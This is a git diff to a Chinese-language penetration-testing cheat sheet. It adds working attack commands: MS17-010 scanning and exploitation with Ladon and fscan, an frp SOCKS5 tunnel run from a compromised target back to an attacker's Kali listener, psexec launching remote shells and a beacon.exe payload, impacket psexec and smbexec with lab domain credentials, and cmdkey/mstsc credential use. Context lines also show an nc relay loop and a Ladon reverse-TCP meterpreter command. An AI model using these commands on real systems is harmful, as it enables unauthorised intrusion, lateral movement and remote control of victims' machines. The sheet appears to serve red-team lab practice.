@@ -57,6 +57,14 @@ while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
 ### 17-010: AutoBlue-MS17-010
 [​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
 
+常用 
+```sh
+Ladon.exe 192.168.50.153 MS17010
+fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
+# "1qaz@WSX!@#4"
+# 3. https://www.freebuf.com/vuls/356052.html
+```
+
 ```shell
 ./shell_prep.sh
 
@@ -177,7 +185,29 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 ## frp
 [神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
 
-frpc
+
+* 常规方式
+
+1. 攻击机 kali: 192.168.50.80 启监听 `./frps` 或配置
+```conf
+[common]
+bind_addr = 0.0.0.0
+bind_port = 7000
+```
+
+2. 拿到靶机后 Debian启动  `frpc -c frpc.ini` ，配置文件如下：
+```conf
+[common]
+server_addr = 192.168.53.132  
+server_port = 7000          
+[socks5]
+type = tcp
+remote_port = 8989
+plugin = socks5
+```
+3.可使用代理 192.168.50.80:8989
+
+* 其他使用 frpc
 ```shell
 frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
 # 相当于
@@ -191,6 +221,8 @@ local_ip = 127.0.0.1
 local_port = 1234
 remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
 ```
+
+
 ## goproxy
 
 ```shell
@@ -449,3 +481,34 @@ keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore
 ## 向日葵_识别码和验证码提取工具
 
 https://github.com/wafinfo/Sunflower_get_Password
+
+# Domain/域
+## psexec
+```bat
+psexec \\ip -u administrator -p admin cmd  进⼊半交互式shell
+psexec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell
+psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯作⽬录
+psexec \\ip -u administrator -p admin whoami all 执行命令
+psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件
+psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件
+```
+## impacket
+
+
+```sh
+# 注意前缀本例是域名 god/
+# 1.命令行
+python psexec.py god/administrator:hongrisec@2019@192.168.52.143
+python smbexec.py god/administrator:hongrisec@2019@192.168.52.143 
+# 1.1 msf msf_psexec.rc
+# 2.执行命令
+python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
+```
+
+## mstsc
+```bat
+:: 1个服务器只能保留一个凭据
+cmdkey /generic:"TERMSRV/192.168.50.153" /user:"admin" /pass:"123456"
+cmdkey /generic:"192.168.50.153" /user:"admin" /pass:"123456"
+mstsc /admin /v:192.168.50.153:33089
+```
